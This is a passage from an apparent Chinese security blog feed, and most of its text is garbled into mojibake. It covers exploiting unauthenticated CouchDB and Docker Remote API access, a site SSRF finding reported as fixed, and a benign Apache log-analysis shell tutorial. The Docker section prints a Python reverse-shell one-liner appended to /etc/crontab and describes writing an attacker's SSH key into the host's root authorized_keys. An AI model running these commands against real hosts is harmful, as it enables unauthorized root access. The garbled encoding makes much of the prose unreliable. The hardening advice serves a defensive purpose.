<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-4.png" alt=""><br>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œä¸‹è½½ä¸ªå…¶ä»–ä»€ä¹ˆçš„<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-5.png" alt=""><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-6.png" alt=""></p>
<h2 id="9-3-æ¼æ´åŠ å›º"><a href="#9-3-æ¼æ´åŠ å›º" class="headerlink" title="9.3 æ¼æ´åŠ å›º"></a>9.3 æ¼æ´åŠ å›º</h2><ul>
<li>æŒ‡å®šCouchDBç»‘å®šçš„IP ï¼ˆéœ€è¦é‡å¯CouchDBæ‰èƒ½ç”Ÿæ•ˆï¼‰ åœ¨ /etc/couchdb/local.ini æ–‡ä»¶ä¸­æ‰¾åˆ° â€œbind_address = 0.0.0.0â€ ï¼ŒæŠŠ 0.0.0.0 ä¿®æ”¹ä¸º 127.0.0.1 ï¼Œç„¶åä¿å­˜ã€‚æ³¨ï¼šä¿®æ”¹ååªæœ‰æœ¬æœºæ‰èƒ½è®¿é—®CouchDBã€‚</li>
<li>è®¾ç½®è®¿é—®å¯†ç  ï¼ˆéœ€è¦é‡å¯CouchDBæ‰èƒ½ç”Ÿæ•ˆï¼‰ åœ¨ /etc/couchdb/local.ini ä¸­æ‰¾åˆ°â€œ[admins]â€å­—æ®µé…ç½®å¯†ç </li>
</ul>
<h1 id="0x10-Dockeræœªæˆæƒè®¿é—®"><a href="#0x10-Dockeræœªæˆæƒè®¿é—®" class="headerlink" title="0x10 Dockeræœªæˆæƒè®¿é—®"></a>0x10 Dockeræœªæˆæƒè®¿é—®</h1><h2 id="10-1-æ¼æ´æè¿°"><a href="#10-1-æ¼æ´æè¿°" class="headerlink" title="10.1 æ¼æ´æè¿°"></a>10.1 æ¼æ´æè¿°</h2><p>Docker Remote APIæ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚é€šè¿‡ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ªAPIï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»ºcontainerï¼Œåˆ é™¤å·²æœ‰çš„containerï¼Œç”šè‡³æ˜¯è·å–å®¿ä¸»æœºçš„shell</p>
<h2 id="10-2-æ¼æ´åˆ©ç”¨"><a href="#10-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="10.2 æ¼æ´åˆ©ç”¨"></a>10.2 æ¼æ´åˆ©ç”¨</h2><p><a href="http://192.168.198.130:2375/v1.25/images/json" target="_blank" rel="external">http://192.168.198.130:2375/v1.25/images/json</a></p>
<p>å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„ images åˆ—è¡¨</p>
<p><a href="http://host:2375/containers/json" target="_blank" rel="external">http://host:2375/containers/json</a></p>
<p>ä¼šè¿”å›æœåŠ¡å™¨å½“å‰è¿è¡Œçš„ containeråˆ—è¡¨ï¼Œå’Œåœ¨docker CLIä¸Šæ‰§è¡Œ docker ps çš„æ•ˆæœä¸€æ ·ï¼Œè¿‡PoståŒ…æˆ‘ä»¬è¿˜å¯ä»¥æ–°å»ºã€å¼€å¯å’Œå…³é—­å®¹å™¨ï¼Œå…¶ä»–æ“ä½œæ¯”å¦‚æ‹‰å–imageç­‰æ“ä½œä¹Ÿéƒ½å¯ä»¥é€šè¿‡APIè°ƒç”¨å®Œæˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl http://10.10.10.10:2375/containers/json</div><div class="line">[]</div><div class="line"></div><div class="line">docker -H=tcp://10.10.10.10:2375 ps         </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div></pre></td></tr></table></figure>
<p>Docker remote Apiæœªæˆæƒè®¿é—®çš„æ”»å‡»åŸç†ä¸ä¹‹å‰çš„Redisæœªæˆæƒè®¿é—®æ¼æ´å¤§åŒå°å¼‚ï¼Œéƒ½æ˜¯é€šè¿‡å‘è¿è¡Œè¯¥åº”ç”¨çš„æœåŠ¡å™¨å†™æ–‡ä»¶ï¼Œä»è€Œæ‹¿åˆ°æœåŠ¡å™¨çš„æƒé™ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹:</p>
<p><strong>1ã€å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½å®¿ä¸»æœºçš„/root/ç›®å½•ï¼Œä¹‹åå°†æ”»å‡»è€…çš„sshå…¬é’¥~/.ssh/id_rsa.pubçš„å†…å®¹å†™åˆ°å…¥å®¿ä¸»æœºçš„/root/.ssh/authorized_keysæ–‡ä»¶ä¸­ï¼Œä¹‹åå°±å¯ä»¥ç”¨rootè´¦æˆ·ç›´æ¥ç™»å½•äº†</strong></p>
<p><strong>2ã€å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½å®¿ä¸»æœºçš„/etc/ç›®å½•ï¼Œä¹‹åå°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°/etc/crontabä¸­ï¼Œæ”»å‡»è€…ä¼šå¾—åˆ°ä¸€ä¸ªåå¼¹çš„shell</strong>ï¼Œå…¶ä¸­åå¼¹shellè„šæœ¬çš„æ ·ä¾‹å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;*/1 * * * * root /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot; &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure></p>
<p>ç¬¬2ç§åˆ©ç”¨æ–¹æ³•ä¹Ÿå¯ä»¥æŒ‚è½½var/spool/cron/ç›®å½•ï¼Œå°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°/var/spool/cron/rootï¼ˆcentosç³»ç»Ÿï¼‰æˆ–/var/spool/cron/crontabs/root(ubuntuç³»ç»Ÿ)</p>
<h2 id="10-3-æ¼æ´åŠ å›º"><a href="#10-3-æ¼æ´åŠ å›º" class="headerlink" title="10.3 æ¼æ´åŠ å›º"></a>10.3 æ¼æ´åŠ å›º</h2><ul>
<li><p>åœ¨ä¸å¿…éœ€çš„æƒ…å†µä¸‹ï¼Œä¸è¦å¯ç”¨dockerçš„remote apiæœåŠ¡ï¼Œå¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„åŠ å›ºæ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">è®¾ç½®ACLï¼Œä»…å…è®¸ä¿¡ä»»çš„æ¥æºIPè¿æ¥ï¼›</div><div class="line">è®¾ç½®TLSè®¤è¯ï¼Œå®˜æ–¹çš„æ–‡æ¡£ä¸ºProtect the Docker daemon socket</div></pre></td></tr></table></figure>
</li>
<li><p>å®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡export DOCKER_TLS_VERIFY=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export DOCKER_CERT_PATH=~/.docker</div><div class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</div><div class="line">export DOCKER_API_VERSION=1.12</div></pre></td></tr></table></figure>
</li>
<li><p>åœ¨ docker api æœåŠ¡å™¨å‰é¢åŠ ä¸€ä¸ªä»£ç†ï¼Œä¾‹å¦‚ nginxï¼Œè®¾ç½® 401 è®¤è¯</p>
</li>
</ul>
<h1 id="é™„ï¼šPythonæœªæˆæƒè®¿é—®è„šæœ¬"><a href="#é™„ï¼šPythonæœªæˆæƒè®¿é—®è„šæœ¬" class="headerlink" title="é™„ï¼šPythonæœªæˆæƒè®¿é—®è„šæœ¬"></a>é™„ï¼š<a href="http://oa8y5guqs.bkt.clouddn.com/unauthorized_access.py" target="_blank" rel="external">Pythonæœªæˆæƒè®¿é—®è„šæœ¬</a></h1><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.secpulse.com/archives/55928.html" target="_blank" rel="external">https://www.secpulse.com/archives/55928.html</a></p>
<p><a href="https://www.secpulse.com/archives/49115.html" target="_blank" rel="external">https://www.secpulse.com/archives/49115.html</a></p>
<p><a href="https://www.secpulse.com/archives/6540.html" target="_blank" rel="external">https://www.secpulse.com/archives/6540.html</a></p>
<p><a href="https://xianzhi.aliyun.com/forum/mobile/read/750.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/750.html</a></p>
<p><a href="https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html" target="_blank" rel="external">https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html</a></p>
<p><a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">https://www.secpulse.com/archives/2166.html</a></p>
<p><a href="https://github.com/findys/sunburst/" target="_blank" rel="external">https://github.com/findys/sunburst/</a></p>
<p><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/</a></p>
<h2 id="å®‰å…¨è„‰æé“¾æ¥æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“"><a href="#å®‰å…¨è„‰æé“¾æ¥æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“" class="headerlink" title="å®‰å…¨è„‰æé“¾æ¥æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“"></a>å®‰å…¨è„‰æé“¾æ¥<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="external">æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“</a></h2>]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Python </tag>
            
            <tag> æœªæˆæƒè®¿é—® </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å®‰å…¨è„‰ææ¼æ´æŒ–æ˜å°è®°]]></title>
      <url>/2017/08/07/%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>ä¸çŸ¥é“å¤§å®¶ä¹‹å‰å¯¹å®‰å…¨è„‰ææ‰“å¼€çš„æ—¶å€™æ˜¯ä¸æ˜¯æ„Ÿè§‰å“åº”å¾ˆæ…¢ï¼Œæ‰€ä»¥æœ€è¿‘ä¸€ç›´åœ¨æ’æŸ¥ï¼Œç„¶åé‡æ–°æ›´æ¢wordpressä¸»é¢˜è¿›è¡Œæ”¹ç‰ˆå‡çº§ã€‚åœ¨å¯¹å®‰å…¨è„‰æè¿›è¡Œç»´æŠ¤ã€æ›´æ–°çš„æ—¶å€™ï¼Œå¶ç„¶ä¹‹é—´å‘ç°äº†è„‰æä¸Šçš„å‡ ä¸ªæ¼æ´ï¼Œåœ¨æ­¤è®°å½•ä¸‹ã€‚<br><a id="more"></a></p>
<p>é¦–å…ˆï¼Œæ‰“å¼€ä¸»é¡µã€‚</p>
<p>æ‰“å¼€æŸä¸ªç½‘ç«™ä¸çŸ¥é“å¤§å®¶æœ‰ä»€ä¹ˆä¹ æƒ¯ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªâ€ç¨‹åºå‘˜â€çš„æˆ‘æ¥è¯´(ä¼ªç¨‹åºå‘˜,æˆ‘æœ€å–œæ¬¢æœ‰äººå«æˆ‘ç¨‹åºå‘˜äº†)ï¼Œ<em>F12</em>æ²¡å…³è¿‡ã€‚[æ–œçœ¼ç¬‘]</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/secpulse_ssrf1.png" alt=""></p>
<p>ä¸çŸ¥é“å¤§å®¶çœ‹è¿™ä¸ªå›¾ä¹‹åæ•ä¸æ•æ„Ÿï¼Œåæ­£æˆ‘æ˜¯æŒºæ•æ„Ÿçš„(è®©æˆ‘è£…ä¸ªé€¼)ã€‚ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™ä¹ˆä¹…äº†ç«Ÿç„¶æ²¡äººå‘ç°â€¦</p>
<p>è¦æ˜¯ä½ ä½ å’‹ç©ï¼Œé¦–å…ˆæˆ‘æ¥äº†ä¸ªç™¾åº¦<code>https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png&amp;h=304&amp;w=504&amp;zc=1</code></p>
<p>æƒŠå–œæ¥äº†ï¼Œç«Ÿç„¶æŠŠç½‘ç«™ç»å¯¹è·¯å¾„æŠ¥å‡ºæ¥äº†ï¼ä¿¡æ¯æ¯”è¾ƒæ•æ„Ÿï¼Œæˆ‘å°±ä¸æ”¾å›¾äº†ã€‚</p>
<p>è¿™å°±å­˜åœ¨ä¸¤ä¸ªæ¼æ´äº†ï¼š</p>
<ul>
<li>æ²¡æœ‰å…³é—­é”™è¯¯å›æ˜¾</li>
<li>æ²¡æœ‰å¯¹srcå‚æ•°çš„é™æ€æ–‡ä»¶é“¾æ¥ä½œæ ¡éªŒ</li>
</ul>
<p>ç„¶åçœ‹åˆ°<code>src</code>å‚æ•°ï¼Œå¤§å®¶ä¼šæƒ³åˆ°å•¥ï¼Œæ²¡é”™ï¼SSRFï¼</p>
<p>æ¥ä¸€æ³¢è¯•è¯•</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/secpulse_ssrf2.png" alt=""></p>
<p>æ²¡æ¯›ç—…ï¼</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%B2%A1%E6%AF%9B%E7%97%85.jpg" alt=""></p>
<p>ç„¶åæˆ‘å°±æƒ³ç€ è¿™æ˜¯ä¸æ˜¯ä¸ªé€šç”¨æ¼æ´å•Šï¼Œæ²¡å‡†æ‹¿ä¸ªCVEå‘¢(ä¸è¦æ­ç©¿æˆ‘ï¼Œè®©æˆ‘æ„æ·«ä¸€ä¼š)ï¼Œç„¶åæˆ‘æœäº†ä¸‹ï¼Œç«Ÿç„¶çœŸæ²¡æœ‰è¿™ä¸ªæ’ä»¶çš„SSRFæ¼æ´ï¼Œä½†æ˜¯ï¼ï¼ï¼æ‚²ä¼¤çš„æ˜¯æˆ‘å‘ç°ç«Ÿç„¶ä¸ç»´æŠ¤æ›´æ–°äº†ã€‚ã€‚ã€‚å¥½å§ã€‚ã€‚</p>
<p>ç„¶åæœäº†ä¸€ä¸‹è¿™ä¸ªæ’ä»¶çš„å…¶ä»–æ¼æ´ï¼Œç«Ÿç„¶å‘ç°ä¸ªå‘½ä»¤æ‰§è¡Œï¼å˜¿å˜¿å˜¿å˜¿å˜¿ã€‚ã€‚ã€‚</p>
<p>ä¸è¯´äº†ï¼Œå››çˆ·åœ¨æˆ‘èº«è¾¹å‘¢ï¼Œæˆ‘æ€•è¢«æ‰“æ­»ã€‚</p>
<p>PS:å¤§å®¶ä¸è¦ç©äº†ï¼Œå·²ç»ä¿®å¤äº†ã€‚ã€‚ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[çœ‹æˆ‘å¦‚ä½•ç”¨20è¡Œä»£ç åšæ—¥å¿—åˆ†æ]]></title>
      <url>/2017/07/29/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%81%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>ä¸ç®¡æ˜¯æ¸—é€æµ‹è¯•ã€åº”æ€¥å“åº”è¿˜æ˜¯è¿ç»´ï¼Œæ—¥å¿—åˆ†æéƒ½ä¸‡åˆ†é‡è¦ã€‚è€Œlinuxä¸‹æ—¥å¿—åˆ†ææœ€å¥½çš„å·¥å…·é‚£å°±æ˜¯linuxè‡ªå¸¦çš„å„ç§å‘½ä»¤äº†ã€‚æœ¬æ–‡å°†ä»ä¸€ä¸ªå°ä¾‹å­æ¥ä»‹ç»â€å¦‚ä½•ç”¨linuxå‘½ä»¤åšæ—¥å¿—åˆ†æâ€ã€‚<br><a id="more"></a></p>
<h1 id="0x00-æºç "><a href="#0x00-æºç " class="headerlink" title="0x00 æºç "></a>0x00 æºç </h1><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%B9%B21.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">if ls ./*.result &amp;&gt; /dev/null</div><div class="line">then</div><div class="line">    rm *.result</div><div class="line">fi</div><div class="line">touch log.result</div><div class="line">for i in www-*.log</div><div class="line">do</div><div class="line">    echo $i ...</div><div class="line">    awk &apos;$9 == 200 &#123;print $7&#125;&apos; $i|grep -i &apos;^/admin/upload/.*\.html$&apos;|sort|uniq -c|sed &apos;s/^ *//g&apos; &gt; $i.result</div><div class="line">    cat $i.result &gt;&gt; log.result</div><div class="line">    echo $i.result finished</div><div class="line">done</div><div class="line">echo final.log.result ...</div><div class="line">sort -k2 log.result | uniq -f1 --all-repeated=separate |./log.awk |sort -rn &gt; final.log.result</div><div class="line">echo final.log.result finished</div><div class="line"></div><div class="line">log.awk</div><div class="line">#!/usr/bin/awk -f</div><div class="line">BEGIN&#123;</div><div class="line">    RS=&quot;&quot;&#125;</div><div class="line">ã€€ã€€&#123;</div><div class="line">    sum=0</div><div class="line">    for(i=1;i&lt;=NF;i++)&#123;</div><div class="line">        if((i%2)!=0)&#123;</div><div class="line">            sum += $i&#125;</div><div class="line">ã€€ã€€&#125;</div><div class="line">        print sum,$2</div><div class="line">ã€€ã€€&#125;</div></pre></td></tr></table></figure></p>
<h1 id="0x01-Apacheæ—¥å¿—"><a href="#0x01-Apacheæ—¥å¿—" class="headerlink" title="0x01 Apacheæ—¥å¿—"></a>0x01 Apacheæ—¥å¿—</h1><p>ä»¥apacheæ—¥å¿—ä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯ä¸‰æ¡æ™®é€šçš„apacheæ—¥å¿—è®°å½•ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html HTTP/1.1&quot; 200 4649 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/js/jquery-2.2.4.min.js HTTP/1.1&quot; 200 85578 &quot;http://121.43.182.76/vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:13 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/favicon.ico HTTP/1.1&quot; 200 1517 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div></pre></td></tr></table></figure></p>
<p><code>58.40.124.211</code>è¡¨ç¤ºè®¿é—®è€…IPï¼Œ<code>25/Jul/2017:08:53:12 +0800</code>è¡¨ç¤ºæ—¶é—´ï¼Œ<code>GET</code>è¡¨ç¤ºè¯·æ±‚æ–¹æ³•ï¼Œ<code>vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html</code>è¡¨ç¤ºè®¿é—®çš„åœ°å€ï¼Œ<code>HTTP/1.1</code>è¡¨ç¤ºä½¿ç”¨HTTPåè®®çš„1.1ç‰ˆæœ¬ï¼Œ<code>200</code>è¡¨ç¤ºå“åº”çŠ¶æ€ç ï¼Œ<code>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0</code>è¡¨ç¤ºè®¿é—®è€…user-agent</p>
<p>æˆ‘ä»¬åˆ†æä¸€èˆ¬å…³æ³¨çš„ä¸»è¦å°±æ˜¯ï¼š</p>
<ul>
<li>IPåœ°å€</li>
<li>è®¿é—®çš„åœ°å€</li>
<li>çŠ¶æ€ç </li>
</ul>
<p>æœ¬æ¬¡å°±åªæ¼”ç¤ºè·å–æŸä¸ªåœ°å€çš„è®¿é—®é‡å¹¶æ’åºï¼Œå³ï¼š<code>è®¿é—®é‡ åœ°å€</code>è¿™ç§æ•ˆæœã€‚</p>
<h1 id="0x02-æ€è·¯"><a href="#0x02-æ€è·¯" class="headerlink" title="0x02 æ€è·¯"></a>0x02 æ€è·¯</h1><p>Apacheæ—¥å¿—æ–‡ä»¶æ ¼å¼å½¢å¦‚<code>201707029.log</code>,æ ¹æ®æ–‡ä»¶æ ¼å¼è®¾è®¡æ€»ä½“æ€è·¯å¦‚ä¸‹:</p>
<ul>
<li>å¤„ç†æ¯å¤©çš„æ—¥å¿—ï¼Œç»Ÿè®¡æ¯æ—¥æ–‡ç« è®¿é—®é‡</li>
<li>ç”Ÿæˆæ¯æœˆè®¿é—®ç»“æœï¼Œç»Ÿè®¡æœˆåº¦è®¿é—®é‡</li>
<li>ç”Ÿæˆæ¯å¹´è®¿é—®ç»“æœï¼Œç»Ÿè®¡å¹´åº¦è®¿é—®é‡</li>
</ul>
<h1 id="0x03-å‘½ä»¤è§£æ"><a href="#0x03-å‘½ä»¤è§£æ" class="headerlink" title="0x03 å‘½ä»¤è§£æ"></a>0x03 å‘½ä»¤è§£æ</h1><h2 id="0x03-1-awk"><a href="#0x03-1-awk" class="headerlink" title="0x03.1 awk"></a>0x03.1 awk</h2><p><strong><code>awk &#39;$9 == 200 {print $7}&#39; $i</code></strong></p>
<p>awké»˜è®¤æ˜¯ä»¥ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œ$9è¡¨ç¤ºåŒ¹é…æ˜¯200çš„å“åº”ï¼Œæ‰“å°å‡ºç¬¬ä¸ƒä¸ªå­—æ®µ</p>
<h2 id="0x03-2-grep"><a href="#0x03-2-grep" class="headerlink" title="0x03.2 grep"></a>0x03.2 grep</h2><p><strong><code>grep -i &#39;^/admin/upload/.*\.html$&#39;</code></strong></p>
<p>æ ¹æ®awkåŒ¹é…çš„ç»“æœï¼ŒåŒ¹é…è®¿é—®çš„åœ°å€æ˜¯<code>/admin/upload/.*\.html</code>çš„è®°å½•ã€‚iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œ<code>^$</code>æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´ç»“å°¾ã€‚</p>
<h2 id="0x03-3-sort"><a href="#0x03-3-sort" class="headerlink" title="0x03.3 sort"></a>0x03.3 sort</h2><p><strong><code>sort -k2 log.result</code></strong></p>
<p>ç”±äºåˆæˆçš„è®°å½•æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥è¦å°†ç›¸åŒçš„å½’ç±»ã€‚ä½†æ˜¯ç¬¬ä¸€å­—æ®µæ˜¯è®¿é—®æ¬¡æ•°ï¼Œæ‰€ä»¥ä½¿ç”¨<code>k2</code>å‚æ•°æ ¹æ®ç½‘å€æ’åºã€‚<br><strong><code>sort -rn &gt; final.log.result</code></strong></p>
<p>å¯¹awkè„šæœ¬çš„å¤„ç†ç»“æœè¿›è¡Œæ’åºï¼Œsorté»˜è®¤ä½¿ç”¨ç¬¬ä¸€ä¸ªå­—æ®µï¼Œå‚æ•°rè¡¨ç¤ºé€†åºï¼Œä»å¤§å¾€å°æ’ï¼›å‚æ•°nè¡¨ç¤ºä»¥æ•°å€¼å½¢å¼æ’åº</p>
<h2 id="0x03-4-uniq"><a href="#0x03-4-uniq" class="headerlink" title="0x03.4 uniq"></a>0x03.4 uniq</h2><p><strong><code>uniq -c</code></strong></p>
<p>ä½¿ç”¨uniqè¿‡æ»¤é‡å¤çš„è®°å½•ï¼Œ<code>-c</code>è¡¨ç¤ºæ·»åŠ è¯¥è®°å½•å‡ºç°çš„æ¬¡æ•°ã€‚<br><strong><code>uniq -f1 --all-repeated=separate</code></strong></p>
<p>å‚æ•°<code>f1</code>è¡¨ç¤ºå¿½ç•¥ç¬¬ä¸€ä¸ªå­—æ®µï¼ˆè®¿é—®æ¬¡æ•°ï¼‰ï¼Œåªè€ƒè™‘åé¢çš„å­—æ®µï¼ˆç½‘å€ï¼‰ã€‚å‚æ•°<code>all-repeated=separate</code>ï¼Œè¡¨ç¤ºè¿‡æ»¤æ‰æ‰€æœ‰åªå‡ºç°ä¸€æ¬¡çš„è®°å½•ï¼Œä¿ç•™æ‰€æœ‰é‡å¤çš„è®°å½•ï¼Œå¹¶ä¸”æ¯ä¸€ç»„ä¹‹é—´ç”¨ä¸€ä¸ªç©ºè¡Œåˆ†éš”</p>
<h2 id="0x03-5-sed"><a href="#0x03-5-sed" class="headerlink" title="0x03.5 sed"></a>0x03.5 sed</h2><p><strong><code>sed &#39;s/^ *//g&#39; &gt; $i.result</code></strong></p>
<p>ç”±äºuniqè¿‡æ»¤åæ¯æ¡è®°å½•å‰é¢éƒ½æ˜¯æœ‰ç©ºæ ¼çš„ï¼Œæ‰€ä»¥è¦å…ˆåˆ é™¤æ‰ã€‚sedå‘½ä»¤æ˜¯ä¸€ä¸ªå¤„ç†è¡Œæ–‡æœ¬çš„ç¼–è¾‘å™¨ï¼Œ<code>&#39;s/^ *//g&#39;</code>æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼(^å’Œ*ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼)è¡¨ç¤ºæ¯è¡Œè®°å½•çš„ç©ºæ ¼æ›¿æ¢ä¸ºç©ºï¼ˆå³åˆ é™¤ï¼‰å¹¶å°†æ’åºç»“æœé‡å®šå‘åˆ°æ–‡ä»¶ã€‚</p>
<h2 id="0x03-6-gt-å’Œ-gt-gt"><a href="#0x03-6-gt-å’Œ-gt-gt" class="headerlink" title="0x03.6 &gt;å’Œ&gt;&gt;"></a>0x03.6 &gt;å’Œ&gt;&gt;</h2><p><code>&gt;</code>è¡¨ç¤ºé‡å®šå‘ï¼Œå³è¾“å‡ºè¦†ç›–ï¼Œ<code>&gt;&gt;</code>ä¹Ÿæ˜¯é‡å®šå‘ï¼Œä½†æ˜¯æ˜¯è¡¨ç¤ºè¿½åŠ </p>
